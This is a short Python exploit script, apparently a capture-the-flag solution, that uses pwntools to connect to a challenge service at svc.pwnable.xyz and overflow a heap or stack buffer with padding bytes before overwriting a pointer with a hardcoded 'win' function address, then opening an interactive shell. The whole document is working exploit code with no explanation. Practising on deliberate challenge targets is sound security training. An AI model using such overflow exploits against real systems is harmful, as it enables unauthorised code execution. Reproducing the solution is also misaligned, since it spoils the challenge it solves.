from pwn import *

win_addr = p64(0x40092c)
debug = 0 
if not debug:
    sh = remote('svc.pwnable.xyz', 30023)
else:
    sh = process('./challenge')

sh.sendafter('> ', '1')
name = "A"*0x20
sh.sendafter(': ', name)
sh.sendafter('> ', '2')
sh.sendafter(': ', '0')
name = "A"*0x20 + "B"
sh.sendafter(': ', name)
sh.sendafter('> ', '2')
sh.sendafter(': ', '0')

name = "A"*0x20 + "B"*0x8 + win_addr
sh.sendafter(': ', name)
sh.sendafter('> ', '3')
sh.sendafter(': ', '0')
sh.interactive()

